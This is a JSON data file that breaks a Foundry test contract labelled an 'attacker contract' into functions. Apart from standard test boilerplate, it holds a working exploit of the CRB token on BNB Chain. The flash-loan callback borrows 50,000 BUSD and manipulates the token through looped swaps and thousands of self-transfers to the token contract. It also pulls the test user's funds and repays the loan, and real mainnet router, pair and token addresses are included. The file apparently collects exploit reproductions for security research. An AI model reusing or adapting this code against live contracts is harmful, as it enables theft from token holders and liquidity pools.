[
  {
    "contract/interface": "crb2",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "crb2",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "crb2",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "crb2",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "crb2",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "crb2",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {\n        address[] memory buyPath = new address[](2);\n        buyPath[0] = address(busd);\n        buyPath[1] = address(crb_token);\n\n        address[] memory sellPath = new address[](2);\n        sellPath[0] = address(crb_token);\n        sellPath[1] = address(busd);\n\n        for (uint256 index = 0; index < 70; index++) {\n            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                busd.balanceOf(address(pair)) / 10, 0, buyPath, address(this), block.timestamp\n            );\n            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                crb_token.balanceOf(address(this)), 0, sellPath, address(this), block.timestamp\n            );\n        }\n        busd.transfer(address(crb_token), 2000 * 1e18);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            6_635_861_088_657_488_493_824, 0, buyPath, address(user), block.timestamp\n        );\n\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(1e18, 0, buyPath, address(this), block.timestamp);\n        uint256 amount = crb_token.balanceOf(address(this)) / 10_000;\n        for (uint256 index = 0; index < 100; index++) {\n            crb_token.transfer(address(crb_token), amount);\n        }\n        busd.transfer(address(crb_token), 2000 * 1e18);\n        for (uint256 index = 0; index < 250; index++) {\n            crb_token.transfer(address(crb_token), amount);\n        }\n        crb_token.transferFrom(user, address(this), crb_token.balanceOf(address(user)) / 2);\n        crb_token.transfer(address(crb_token), crb_token.balanceOf(address(this)) - amount * 10_000);\n        busd.transferFrom(user, address(this), busd.balanceOf(address(user)));\n\n        for (uint256 index = 0; index < 3000; index++) {\n            crb_token.transfer(address(crb_token), amount);\n        }\n\n        busd.transfer(address(flashLoan), 50_025 * 1e18);\n        busd.transfer(user, busd.balanceOf(address(this)));\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "crb2",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n        vm.deal(user, 0.2 ether);\n\n        router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n        crb_token = IERC20(0xee6De822159765daf0Fd72d71529d7ab026ec2f2);\n        busd = IERC20(0x55d398326f99059fF775485246999027B3197955);\n        pair = 0x03b051dF794b36E1767cD083fFfDEbbF573eCDA6;\n        flashLoan = Uni_Pair_V3(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);\n\n        busd.approve(address(router), type(uint256).max);\n\n        crb_token.approve(address(router), type(uint256).max);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "crb2",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "crb2",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "crb2",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "crb2",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "crb2",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "crb2",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "crb2",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        vm.startPrank(user, user);\n        busd.approve(address(router), type(uint256).max);\n        busd.approve(address(this), type(uint256).max);\n        crb_token.approve(address(this), type(uint256).max);\n        vm.stopPrank();\n        emit log_named_decimal_uint(\"busd\", busd.balanceOf(address(user)), 18);\n\n        flashLoan.flash(address(this), 50_000 * 1e18, 0, new bytes(1));\n        emit log_named_decimal_uint(\"busd\", busd.balanceOf(address(user)), 18);\n    }\n\n",
    "description": ""
  }
]